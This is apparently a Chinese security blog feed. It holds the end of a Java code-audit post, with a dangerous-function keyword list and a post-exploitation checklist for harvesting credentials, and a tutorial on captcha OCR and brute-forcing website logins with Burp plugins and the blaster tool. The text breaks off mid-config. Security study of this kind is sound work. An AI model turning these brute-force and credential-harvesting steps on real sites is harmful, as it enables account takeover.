expression&#x3D;&quot;&#39;$&#123;param.lang&#125;&#39;&#x3D;&#x3D;&#39;fr&#39;&quot; var&#x3D;&quot;languageIsFrench&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:set var&#x3D;&quot;lang&quot; value&#x3D;&quot;$&#123;param.lang&#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;c:set var&#x3D;&quot;languageIsFrench&quot; value&#x3D;&quot;$&#123;param.lang &#x3D;&#x3D; &#39;fr&#39;&#125;&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>一个自动化搜索java敏感函数的脚本:<a href="https://github.com/Cryin/JavaID">Cryin/JavaID: java source code static code analysis and danger function identify prog (github.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">XXE:</span><br><span class="line">   &quot;SAXReader&quot;,</span><br><span class="line">   &quot;DocumentBuilder&quot;,</span><br><span class="line">   &quot;XMLStreamReader&quot;,</span><br><span class="line">   &quot;SAXBuilder&quot;,</span><br><span class="line">   &quot;SAXParser&quot;,</span><br><span class="line">   &quot;XMLReader&quot;,</span><br><span class="line">   &quot;SAXSource&quot;,</span><br><span class="line">   &quot;TransformerFactory&quot;,</span><br><span class="line">   &quot;SAXTransformerFactory&quot;,</span><br><span class="line">   &quot;SchemaFactory&quot;,</span><br><span class="line">   &quot;Unmarshaller&quot;,</span><br><span class="line">   &quot;XPathExpression&quot;</span><br><span class="line"></span><br><span class="line">JavaObjectDeserialization:</span><br><span class="line">   &quot;readObject&quot;,</span><br><span class="line">   &quot;readUnshared&quot;,</span><br><span class="line">   &quot;Yaml.load&quot;,</span><br><span class="line">   &quot;fromXML&quot;,</span><br><span class="line">   &quot;ObjectMapper.readValue&quot;,</span><br><span class="line">   &quot;JSON.parseObject&quot;</span><br><span class="line">SSRF:</span><br><span class="line">   &quot;HttpClient&quot;,</span><br><span class="line">   &quot;Socket&quot;,</span><br><span class="line">   &quot;URL&quot;,</span><br><span class="line">   &quot;ImageIO&quot;,</span><br><span class="line">   &quot;HttpURLConnection&quot;,</span><br><span class="line">   &quot;OkHttpClient&quot; </span><br><span class="line">   &quot;SimpleDriverDataSource.getConnection&quot;</span><br><span class="line">   &quot;DriverManager.getConnection&quot;</span><br><span class="line">FILE:</span><br><span class="line">   &quot;MultipartFile&quot;,</span><br><span class="line">   &quot;createNewFile&quot;,</span><br><span class="line">   &quot;FileInputStream&quot;</span><br><span class="line">SPelInjection:</span><br><span class="line">   &quot;SpelExpressionParser&quot;,</span><br><span class="line">   &quot;getValue&quot;</span><br><span class="line">Autobinding:</span><br><span class="line">   &quot;@SessionAttributes&quot;,</span><br><span class="line">   &quot;@ModelAttribute&quot;</span><br><span class="line">URL-Redirect:</span><br><span class="line">   &quot;sendRedirect&quot;,</span><br><span class="line">   &quot;forward&quot;,</span><br><span class="line">   &quot;setHeader&quot;</span><br><span class="line">EXEC:</span><br><span class="line">   &quot;getRuntime.exec&quot;,</span><br><span class="line">   &quot;ProcessBuilder.start&quot;,</span><br><span class="line">   &quot;GroovyShell.evaluate&quot;</span><br></pre></td></tr></table></figure><h2 id="poc-amp-exp编写"><a href="#poc-amp-exp编写" class="headerlink" title="poc&amp;exp编写"></a>poc&amp;exp编写</h2><ul><li>编写漏洞检测利用的脚本，不限于py、exe、jar等形式</li><li>批量检测脚本</li><li>适配内存马</li></ul><h2 id="后渗透利用"><a href="#后渗透利用" class="headerlink" title="后渗透利用"></a>后渗透利用</h2><ul><li>数据库配置文件位置、是否需要解密</li><li>数据库中业务攻击面获取（例如oa中管理员、用户账户密码等）</li><li>适配代理工具</li><li>主机敏感信息获取或进一步扩大利用</li></ul><h2 id="相关文档输出"><a href="#相关文档输出" class="headerlink" title="相关文档输出"></a>相关文档输出</h2><ul><li>完整漏洞细节及原理和复现文档</li><li>完整poc&amp;exp工具利用文档</li><li>环境搭建到环境密码信息readme 使用文档</li><li>代码架构整理一份详细的组件分析，包括不限于使用框架，鉴权特性，风险点，整体路由，重要配置文件等</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.javasec.org/">https://www.javasec.org/</a><br><a href="https://xz.aliyun.com/t/3372">https://xz.aliyun.com/t/3372</a><br><a href="https://xz.aliyun.com/t/3460">https://xz.aliyun.com/t/3460</a><br><a href="https://xz.aliyun.com/t/3416">https://xz.aliyun.com/t/3416</a><br><a href="https://xz.aliyun.com/t/3358">https://xz.aliyun.com/t/3358</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>验证码识别&amp;暴力破解</title>
      <link href="2022/04/20/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>2022/04/20/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="验证码识别-amp-暴力破解"><a href="#验证码识别-amp-暴力破解" class="headerlink" title="验证码识别&amp;暴力破解"></a>验证码识别&amp;暴力破解</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于平常Web渗透中，验证码的问题难倒一群英雄汉，前端加密+验证码更是直接放弃，所以下面就分享一下自己在渗透中对验证码识别和存在前端加密情况的暴力破解。</p><p>所有工具都是开源的，并且都是学习需求，切勿用于不法用途，觉得可以的话去给作者点个star吧。</p><h2 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h2><h3 id="burp插件-captcha-killer"><a href="#burp插件-captcha-killer" class="headerlink" title="burp插件-captcha-killer"></a>burp插件-captcha-killer</h3><p>captcha-killer是只专注做好对各种验证码识别技术接口的调用工具，具体点就是burp通过同一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码。</p><p>原GitHub项目地址：<a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p><p>修改版GitHub项目地址：<a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p><p>使用说明：<a href="https://gv7.me/articles/2019/burp-captcha-killer-usage/">https://gv7.me/articles/2019/burp-captcha-killer-usage/</a></p><ul><li>将获取验证码的数据包发送到插件</li></ul><p>使用burp抓取获取验证码数据包，然后右键<code>captcha-killer</code> -&gt; <code>send to captcha panel</code>发送数据包到插件的验证码请求面板。</p><p><img src="/images/image-20220419094604872.png" alt="image-20220419094604872"></p><p>然后到切换到插件面板，点击获取即可拿到要识别的验证码图片内容。</p><p><img src="/images/image-20220419094717568.png" alt="image-20220419094717568"></p><p><strong>注意：获取验证码的cookie一定要和intruder发送的cookie相同！</strong></p><ul><li>配置识别接口的地址和请求包</li></ul><p>拿到验证码之后，就要设置接口来进行识别了。我们可以使用网上寻找免费的接口，也可以本地起一个验证码识别的服务</p><p>ddddocr识别接口数据包实例如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ocr/b64/json</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.50.71:9898</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"></span><br><span class="line">&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;</span><br></pre></td></tr></table></figure><p>然后我们把图片内容的位置用标签来代替。比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么<code>Request template</code>(请求模版)面板应该填写如下：</p><p><img src="/images/image-20220419095551063.png" alt="image-20220419095551063"></p><table><thead><tr><th>ID</th><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</code></td><td>代表验证码图片原二进制内容</td></tr><tr><td>2</td><td><code>&lt;@URLENCODE&gt;&lt;/@URLENCODE&gt;</code></td><td>对标签内的内容进行url编码</td></tr><tr><td>3</td><td><code>&lt;@BASE64&gt;&lt;/@BASE64&gt;</code></td><td>对标签内的内容进行base64编码</td></tr></tbody></table><p>后点击“识别”即可获取到接口返回的数据包，同时在<code>request raw</code>可以看到调用接口最终发送的请求包。</p><p><img src="/images/image-20220419095734777.png" alt="image-20220419095734777"></p><ul><li>设置用于匹配识别结果的规则</li></ul><p>通过上一步我们获取到了识别接口的返回结果，但是插件并不知道返回结果中，哪里是真正的识别结果。插件提供了4中方式进行匹配，可以根据具体情况选择合适的。</p><table><thead><tr><th>ID</th><th>规则类型</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>Repose data</td><td>这种规则用于匹配接口返回包内容直接是识别结果</td></tr><tr><td>2</td><td>Regular expression</td><td>正则表达式,适合比较复杂的匹配。比如接口返回包<code>&#123;&quot;coede&quot;:1,&quot;result&quot;:&quot;abcd&quot;&#125;</code>说明abcd是识别结果，我们可以编写规则为<code>result&quot;:&quot;(.*?)&quot;\&#125;</code></td></tr><tr><td>3</td><td>Define the start and end positions</td><td>定义开始和结束位置,使用上面的例子，可以编写规则<code>&#123;&quot;start&quot;:21,&quot;end&quot;:25&#125;</code></td></tr><tr><td>4</td><td>Defines the start and end strings</td><td>定义开始和结束字符，使用上面的例子，可以编写规则为<code>&#123;&quot;start&quot;:&quot;result\&quot;:\&quot;,&quot;end&quot;:&quot;\&quot;\&#125;&quot;&#125;</code></td></tr></tbody></table><p>通过分析我们知道，接口返回的json数据中，字段<code>result</code>的值为识别结果。我们这里使用<code>Regular expression</code>(正则表达式)来匹配，然后选择<code>78cc</code>右键<code>标记为识别结果</code>，系统会自动生成正则表达式规则<code>&quot; (.*?)&quot;\&#125;\]</code>。</p><p><img src="/images/image-20220419095847618.png" alt="image-20220419095847618"></p><p>注意：若右键标记自动生成的规则匹配不精确，可以人工进行微调。比如该例子中可以微调规则为<code>&quot;result&quot;\: &quot;(.*?)&quot;\&#125;</code>将更加准确！</p><p>点击识别可从右边侧栏查看准确率</p><p><img src="/images/image-20220419100343450.png" alt="image-20220419100343450"></p><p>到达这步建议将配置好常用接口的url，数据包已经匹配规则保存为模版，方便下次直接通过右键<code>模板库</code>中快速设置。</p><p><img src="/images/image-20220419100103753.png" alt="image-20220419100103753"></p><ul><li>在Intruder模块调用</li></ul><p>配置好各项后，可以点击<code>锁定</code>对当前配置进行锁定，防止被修改导致爆破失败！接着按着以下步骤进行配置</p><p><img src="/images/image-20220419102125943.png" alt="image-20220419102125943"></p><p><img src="/images/image-20220419101936267.png" alt="image-20220419101936267"></p><p>即可进行爆破</p><p><img src="/images/image-20220419102240400.png" alt="image-20220419102240400"></p><h3 id="ddddocr"><a href="#ddddocr" class="headerlink" title="ddddocr"></a>ddddocr</h3><p><a href="https://github.com/sml2h3/ddddocr">https://github.com/sml2h3/ddddocr</a></p><p>简介</p><p>ddddocr是由sml2h3开发的专为验证码厂商进行对自家新版本验证码难易强度进行验证的一个python库，其由作者与kerlomz共同合作完成，通过大批量生成随机数据后进行深度网络训练，本身并非针对任何一家验证码厂商而制作，本库使用效果完全靠玄学，可能可以识别，可能不能识别。</p><p>使用ocr_api_server一键启动识别服务</p><p><a href="https://github.com/sml2h3/ocr_api_server">https://github.com/sml2h3/ocr_api_server</a></p><ul><li>最简单运行方式</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖</span><br><span class="line">pip install -r requirements.txt -i https://pypi.douban.com/simple</span><br><span class="line"></span><br><span class="line"># 运行  可选参数如下</span><br><span class="line"># --port <span class="number">9898</span> 指定端口,默认为<span class="number">9898</span></span><br><span class="line"># --ocr 开启ocr模块 默认开启</span><br><span class="line"># --old 只有ocr模块开启的情况下生效 默认不开启</span><br><span class="line"># --det 开启目标检测模式</span><br><span class="line"></span><br><span class="line"># 最简单运行方式，只开启ocr模块并以新模型计算</span><br><span class="line">python ocr_server.py --port <span class="number">9898</span> --ocr</span><br><span class="line"></span><br><span class="line"># 开启ocr模块并使用旧模型计算</span><br><span class="line">python ocr_server.py --port <span class="number">9898</span> --ocr --old</span><br><span class="line"></span><br><span class="line"># 只开启目标检测模块</span><br><span class="line">python ocr_server.py --port <span class="number">9898</span>  --det</span><br><span class="line"></span><br><span class="line"># 同时开启ocr模块以及目标检测模块</span><br><span class="line">python ocr_server.py --port <span class="number">9898</span> --ocr --det</span><br><span class="line"></span><br><span class="line"># 同时开启ocr模块并使用旧模型计算以及目标检测模块</span><br><span class="line">python ocr_server.py --port <span class="number">9898</span> --ocr --old --det</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>docker运行方式(目测只能在Linux下部署)</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sml2h3/ocr_api_server.git</span><br><span class="line"># docker怎么安装？百度吧</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ocr_api_server</span><br><span class="line"></span><br><span class="line"># 修改entrypoint.sh中的参数，具体参数往上翻，默认<span class="number">9898</span>端口，同时开启ocr模块以及目标检测模块</span><br><span class="line"></span><br><span class="line"># 编译镜像</span><br><span class="line">docker build -t ocr_server:v1 .</span><br><span class="line"></span><br><span class="line"># 运行镜像</span><br><span class="line">docker run -p <span class="number">9898</span>:<span class="number">9898</span> -d ocr_server:v1</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>接口</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、测试是否启动成功，可以通过直接GET访问http://&#123;host&#125;:&#123;port&#125;/ping来测试，如果返回pong则启动成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、OCR/目标检测请求接口格式：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://&#123;host&#125;:&#123;port&#125;/&#123;opt&#125;/&#123;img_type&#125;/&#123;ret_type&#125;</span></span><br><span class="line"><span class="comment"># opt：操作类型 ocr=OCR det=目标检测 slide=滑块（match和compare两种算法，默认为compare)</span></span><br><span class="line"><span class="comment"># img_type: 数据类型 file=文件上传方式 b64=base64(imgbyte)方式 默认为file方式</span></span><br><span class="line"><span class="comment"># ret_type: 返回类型 json=返回json（识别出错会在msg里返回错误信息） text=返回文本格式（识别出错时回直接返回空文本）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># OCR请求</span></span><br><span class="line"><span class="comment"># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/ocr/file&quot;, files=&#123;&#x27;image&#x27;: image_bytes&#125;)</span></span><br><span class="line"><span class="comment"># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/ocr/b64/text&quot;, data=base64.b64encode(file).decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标检测请求</span></span><br><span class="line"><span class="comment"># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/det/file&quot;, files=&#123;&#x27;image&#x27;: image_bytes&#125;)</span></span><br><span class="line"><span class="comment"># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/ocr/b64/json&quot;, data=base64.b64encode(file).decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 滑块识别请求</span></span><br><span class="line"><span class="comment"># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/slide/match/file&quot;, files=&#123;&#x27;target_img&#x27;: target_bytes, &#x27;bg_img&#x27;: bg_bytes&#125;)</span></span><br><span class="line"><span class="comment"># jsonstr = json.dumps(&#123;&#x27;target_img&#x27;: target_b64str, &#x27;bg_img&#x27;: bg_b64str&#125;)</span></span><br><span class="line"><span class="comment"># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/slide/compare/b64&quot;, files=base64.b64encode(jsonstr.encode()).decode())</span></span><br></pre></td></tr></table></figure><p>详细实操步骤：</p><ul><li>step1：安装下载项目依赖</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;sml2h3&#x2F;ocr_api_server.git</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -r requirements.txt -i https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple</span><br></pre></td></tr></table></figure><ul><li>step2：运行开启</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 最简单运行方式，只开启ocr模块并以新模型计算</span><br><span class="line">python3 ocr_server.py --port 9898 --ocr</span><br><span class="line"></span><br><span class="line"># 开启ocr模块并使用旧模型计算</span><br><span class="line">python3 ocr_server.py --port 9898 --ocr --old</span><br><span class="line"></span><br><span class="line"># 只开启目标检测模块</span><br><span class="line">python3 ocr_server.py --port 9898  --det</span><br><span class="line"></span><br><span class="line"># 同时开启ocr模块以及目标检测模块</span><br><span class="line">python3 ocr_server.py --port 9898 --ocr --det</span><br><span class="line"></span><br><span class="line"># 同时开启ocr模块并使用旧模型计算以及目标检测模块</span><br><span class="line">python3 ocr_server.py --port 9898 --ocr --old --det</span><br></pre></td></tr></table></figure><p>可根据需求运行相应的命令</p><p><img src="/images/image-20220419145429200.png" alt="image-20220419145429200"></p><ul><li>step3：接口格式类型</li></ul><p>常用请求模版：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ocr/b64/json</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.50.71:9898</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"></span><br><span class="line">&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;</span><br></pre></td></tr></table></figure><p>配合burp的captcha-killer插件使用，识别准确率还是杠杠的</p><p><img src="/images/image-20220419150904585.png" alt="image-20220419150904585"></p><p>同时作者还公开其训练的脚本，感兴趣的可以自己搞张显卡训练，训练项目如下：</p><p><a href="https://github.com/sml2h3/dddd_trainer">https://github.com/sml2h3/dddd_trainer</a></p><h3 id="dist-cpu"><a href="#dist-cpu" class="headerlink" title="dist-cpu"></a>dist-cpu</h3><p>dist-cpu是已经训练好的ocr识别项目（现github地址已删除）</p><p>双击exe即可运行，监听地址为<a href="http://0.0.0.0:19952/%EF%BC%8C%E7%9B%91%E5%90%AC%E5%9C%B0%E5%9D%80%E5%92%8C%E7%AB%AF%E5%8F%A3%E5%8F%AF%E5%9C%A8config.yaml%E4%B8%AD%E6%9B%B4%E6%94%B9">http://0.0.0.0:19952/，监听地址和端口可在config.yaml中更改</a></p><p><img src="/images/image-20220419165903261.png" alt="image-20220419165903261"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/captcha/v1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.200.254.79:19952</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3854</span><br><span class="line"></span><br><span class="line">&#123;&quot;image&quot;:&quot;&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;&quot;&#125;</span><br></pre></td></tr></table></figure><p>配合burp插件captcha-kiler使用，使用方法和ddddocr类似，效果比ddddocr差些</p><p><img src="/images/image-20220419172209252.png" alt="image-20220419172209252"></p><h3 id="PKAV-HTTP-Fuzzer"><a href="#PKAV-HTTP-Fuzzer" class="headerlink" title="PKAV HTTP Fuzzer"></a>PKAV HTTP Fuzzer</h3><p>需要安装.net framework 4.0或以上版本。</p><p><img src="/images/image-20220419164748908.png" alt="image-20220419164748908"></p><p><img src="/images/image-20220419165214811.png" alt="image-20220419165214811"></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="blaster-ddddocr"><a href="#blaster-ddddocr" class="headerlink" title="blaster+ddddocr"></a>blaster+ddddocr</h3><p><a href="https://github.com/PoJun-Lab/blaster">https://github.com/PoJun-Lab/blaster</a></p><p>blaster 是一款弱密码隐患检测工具，用于网站登录弱密码检测。</p><p>无论是在漏洞响应平台，还是日常工作中，大家或许在为图片验证码、登录加密等无法直接登录测试而烦恼，所以blaster应运而生。它支持导入用户名密码字典，多并发图片验证码识别，自动填充表单元素，无视任何登录加密。</p><ul><li><strong>支持复选框勾选</strong>：主要场景为阅读平台使用须知、 隐私政策单选表单等。</li><li><strong>支持复杂场景的事件操作</strong>：可根据不同场景，在登录前后自定义事件操作。</li><li><strong>支持正则匹配反向过滤</strong>：应对不同响应类型、长度，提取关键信息进行反向过滤。</li><li><strong>图片验证码识别</strong>：采用python第三方库进行ocr识别。</li><li><strong>无视任何加密方式</strong>：它将用户名及密码字典填充至对应表单进行提交，无需逆向加密方式。</li><li><strong>支持多次输入账号密码错误才出现验证码情况</strong></li><li><strong>支持多并发</strong></li></ul><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>服务端搭建，该服务对应客户端配置中的 <strong>captchabreak_serverurl</strong>，它用于图片验证码识别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cbhs.py -a user:pass -p port# 自定义服务端basic认证用户名密码、开放端口</span><br></pre></td></tr></table></figure><p>客户端配置 config.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例目标网址：http://www.example.com/login</span></span><br><span class="line"><span class="comment"># 示例登录目标最终发送的请求数据包地址：http://www.example.com/api/user/login</span></span><br><span class="line"><span class="comment"># 示例图片验证码识别服务：python3 cbhs.py -a admin:123 -p 8999</span></span><br><span class="line"></span><br><span class="line"><span class="attr">target_url:</span> <span class="string">&#x27;http://www.example.com/login&#x27;</span> <span class="comment"># 登录目标网址</span></span><br><span class="line"><span class="attr">browser_path:</span> <span class="string">&#x27;C:\Program Files\Google\Chrome\Application\chrome.exe&#x27;</span> <span class="comment"># 浏览器的路径</span></span><br><span class="line"><span class="attr">headless:</span> <span class="literal">false</span> <span class="comment"># 设置false显式运行浏览器 true则反之</span></span><br><span class="line"><span class="attr">captchabreak_serverurl:</span> <span class="string">&#x27;http://admin:123@127.0.0.1:8999/cb&#x27;</span> <span class="comment"># 